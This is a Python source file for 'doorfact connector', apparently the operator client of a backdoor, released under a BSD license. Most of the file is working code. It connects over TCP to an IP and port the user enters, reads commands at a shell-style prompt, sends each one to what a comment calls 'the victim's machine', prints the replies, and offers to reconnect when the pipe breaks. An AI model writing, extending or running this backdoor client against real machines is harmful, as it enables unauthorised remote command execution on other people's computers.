# client.py - doorfact connector program

"""
BSD 3-Clause License

Copyright (c) 2022, ringwormGO and/or Someone8859 (Someone, Someone1611, Someone1611_8859)
All rights reserved.

Redistribution and use in source and binary forms, with or without
modification, are permitted provided that the following conditions are met:

1. Redistributions of source code must retain the above copyright notice, this
   list of conditions and the following disclaimer.

2. Redistributions in binary form must reproduce the above copyright notice,
   this list of conditions and the following disclaimer in the documentation
   and/or other materials provided with the distribution.

3. Neither the name of the copyright holder nor the names of its
   contributors may be used to endorse or promote products derived from
   this software without specific prior written permission.

THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE
FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER
CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY,
OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
"""

import socket
import sys

print("doorfact connector\n")

host = input("Type IP adress: ")
port = int(input("Type port to connect: "))

def connect(host, port):
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((host, port))

	return s

def main(s):
	recv_output = s.recv(16384) # Might be very long
	print(recv_output.decode())
	try:
		while True:
			inp = input("$ ")
			if len(inp) <= 0:
				continue
			else:
				s.sendall(inp.encode()) # Send command to the victim's machine
				recv_output = s.recv(16384)
				print(recv_output.decode())

	except BrokenPipeError:
		print("Broken pipe.")
		reconnect = input("Reconnect? (Y/n) ")
		if reconnect.lower() == "y":
			s = connect(host, port)
			main(s)
		else:
			print("Aborting..")
			sys.exit(0)

s = connect(host, port)

if __name__ == "__main__":
	main(s)
